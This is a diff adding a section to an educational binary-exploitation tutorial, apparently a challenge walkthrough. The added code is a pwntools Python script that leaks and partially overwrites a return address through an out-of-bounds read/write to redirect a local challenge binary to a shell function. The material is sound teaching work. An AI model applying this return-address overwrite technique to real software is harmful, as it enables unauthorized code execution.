@@ -223,3 +223,53 @@ $ id
 uid=1000(jbo) gid=1000(jbo) groups=1000(jbo),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),135(lxd),136(sambashare),142(libvirt)
 ```
 
+In certain situations, overriding the return address slightly might also work - and in this case we could just read the lower part of the return address, as the return address to `main` and `give_shell` are so close. Therefore, we could be slighly lazier:
+
+```python
+#!/usr/bin/env python3
+from pwn import *
+
+def read_int(p, idx):
+    p.recvuntil(b': ')
+    p.send(b'R\n')
+    p.recvuntil(b': ')
+    p.send(str(idx).encode() + b'\n')
+    return int(p.recvline().decode().strip().replace('Value: ', '')) & 0xFFFFFFFF
+
+def write_int(p, idx, val):
+    p.recvuntil(b': ')
+    p.send(b'W\n')
+    p.recvuntil(b': ')
+    p.send(str(idx).encode() + b'\n')
+    p.recvuntil(b': ')
+    p.send(str(val).encode() + b'\n')
+
+def read_ret_lo(p):
+    return read_int(p, 14)
+
+def write_ret_lo(p, val):
+    write_int(p, 14, val)
+
+def trigger_quit(p):
+    p.recvuntil(b': ')
+    p.send(b'Q\n')
+    p.interactive()
+
+p = process('./chall')
+ret_addr_lo = read_ret_lo(p)
+log.info(f'Concluded return address low part: 0x{ret_addr_lo:02x}')
+ret_addr_lo -= 0x1dd
+write_ret_lo(p, ret_addr_lo)
+log.info(f'Written new return address low part: 0x{ret_addr_lo:02x}')
+log.info('Triggering')
+trigger_quit(p)
+```
+
+Note how here we just need index `14`. In some case this idea can work amazingly well, e.g. if overriding one or two bytes in the return address.
+
+## Summary
+This is the second in a very long series on intoruction to binary exploitation.  
+We learned how to override the return address and that in some cases stack cookies could be ineffective. We also learned a bit about `ASLR`, and developed a full exploit. Neat!  
+Stay tuned!
+
+Jonathan Bar Or
